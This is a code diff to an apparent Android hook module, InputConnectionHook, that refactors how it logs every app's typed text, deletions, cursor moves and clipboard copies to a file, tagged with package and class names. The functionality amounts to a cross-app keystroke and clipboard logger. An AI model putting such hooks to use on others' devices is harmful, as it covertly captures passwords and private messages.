@@ -60,11 +60,17 @@ public class InputConnectionHook
 
   protected void beforeHookedMethod(MethodHookParam param) throws Throwable
   {
-   writeToFile(new Date().toLocaleString().split(" ")[1]
-               + ", 包:" + lpp.packageName
-               + ", 类:" + param.thisObject.getClass().getCanonicalName()
-               + ", 事件:添加, 位置:" + cursorStartIndex + "-" +cursorEndIndex
-               + ", 内容:" + param.args[0]);
+   StringBuilder sb = new StringBuilder();
+   sb.append(new Date().toLocaleString().split(" ")[1])
+    .append(", 包:").append(lpp.packageName);
+   if(HookConfig.noteClassName == 1)
+    sb.append(", 类:").append(param.thisObject.getClass().getCanonicalName());
+   sb.append(", 事件:添加, 位置:").append(cursorStartIndex);
+   if(cursorStartIndex != cursorEndIndex)
+    sb.append("~").append(cursorEndIndex);
+   sb.append(", 内容:").append(param.args[0]);
+   
+   writeToFile(sb.toString());
   }
 
  }
@@ -82,25 +88,44 @@ public class InputConnectionHook
   {
    KeyEvent ket = (KeyEvent)param.args[0];
    if(ket.getAction() != KeyEvent.ACTION_UP)return;
-   String className = param.thisObject.getClass().getCanonicalName();
-   String keyName = getKeyCodeName(ket.getKeyCode());
-   if(ket.getKeyCode() == KeyEvent.KEYCODE_DEL)
+   
+   StringBuilder sb = new StringBuilder();
+   sb.append(new Date().toLocaleString().split(" ")[1])
+    .append(", 包:").append(lpp.packageName);
+   if(HookConfig.noteClassName == 1)
+    sb.append(", 类:").append(param.thisObject.getClass().getCanonicalName());
+   sb.append(", 事件:").append(getKeyCodeName(ket.getKeyCode()));
+   switch(ket.getKeyCode())
    {
-    CharSequence selCharS = ((InputConnection)param.thisObject).getSelectedText(0);
-    if(selCharS == null || selCharS.length() < 1)
-    {
-     selCharS = ((InputConnection)param.thisObject).getTextBeforeCursor(1,0);
-    }
-    if(selCharS == null)selCharS = "";
-    keyName += ", 位置:" + cursorStartIndex + "-" + cursorEndIndex
-     + ", 内容:" + selCharS;
+    case KeyEvent.KEYCODE_DPAD_UP:
+    case KeyEvent.KEYCODE_DPAD_DOWN:
+    case KeyEvent.KEYCODE_DPAD_LEFT:
+    case KeyEvent.KEYCODE_DPAD_RIGHT:
+    case KeyEvent.KEYCODE_SHIFT_LEFT:
+    case KeyEvent.KEYCODE_SHIFT_RIGHT:
+    case KeyEvent.KEYCODE_TAB:
+    case KeyEvent.KEYCODE_ENTER:
+    case KeyEvent.KEYCODE_SPACE:
+     sb.append(", 位置:").append(cursorStartIndex);
+     if(cursorStartIndex != cursorEndIndex)
+      sb.append("~").append(cursorEndIndex);
+     break;
+    case KeyEvent.KEYCODE_DEL:
+     CharSequence selCharS = ((InputConnection)param.thisObject).getSelectedText(0);
+     if(selCharS == null || selCharS.length() < 1)
+     {
+      selCharS = ((InputConnection)param.thisObject).getTextBeforeCursor(1,0);
+     }
+     if(selCharS == null)selCharS = "";
+     sb.append(", 位置:").append(cursorStartIndex);
+     if(cursorStartIndex != cursorEndIndex)
+      sb.append("~").append(cursorEndIndex);
+     sb.append(", 内容:").append(selCharS);
+     break;
    }
    if(BuildConfig.DEBUG)
-    writeLogFile("Action:"+ket.getAction()+" Key:"+keyName);
-   writeToFile(new Date().toLocaleString().split(" ")[1]
-               + ", 包:" + lpp.packageName
-               + ", 类:" + className
-               + ", 事件:" + keyName);
+    writeLogFile("Action:"+ket.getAction()+" Key:"+getKeyCodeName(ket.getKeyCode()));
+   writeToFile(sb.toString());
   }
 
  }
@@ -140,12 +165,17 @@ public class InputConnectionHook
      cursorEndIndex += clipboardValue.toString().length();
      break;
    }
-   writeToFile(new Date().toLocaleString().split(" ")[1]
-               + ", 包:" + lpp.packageName
-               + ", 类:" + param.thisObject.getClass().getCanonicalName()
-               + ", 事件:" + operation
-               + ", 位置:" + cursorStartIndex + "-" + cursorEndIndex
-               + ", 内容:" + value);
+   StringBuilder sb = new StringBuilder();
+   sb.append(new Date().toLocaleString().split(" ")[1])
+    .append(", 包:").append(lpp.packageName);
+   if(HookConfig.noteClassName == 1)
+    sb.append(", 类:").append(param.thisObject.getClass().getCanonicalName());
+   sb.append(", 事件:").append(operation)
+    .append(", 位置:").append(cursorStartIndex);
+   if(cursorStartIndex != cursorEndIndex)
+    sb.append("~").append(cursorEndIndex);
+   sb.append(", 内容:").append(value);
+   writeToFile(sb.toString());
   }
 
  }
@@ -161,7 +191,7 @@ public class InputConnectionHook
    }else
     clipboardValue = param.args[0];
    if(BuildConfig.DEBUG)
-    writeLogFile("复制内容="+clipboardValue);
+    writeLogFile("复制内容="+param.args[0]);
   }
  }
 
@@ -172,7 +202,7 @@ public class InputConnectionHook
    cursorStartIndex = param.args[0];
    cursorEndIndex = param.args[1];
    if(BuildConfig.DEBUG)
-    writeLogFile("光标位置="+cursorStartIndex+"-"+cursorEndIndex);
+    writeLogFile("光标位置="+cursorStartIndex+"~"+cursorEndIndex);
   }
  }
  
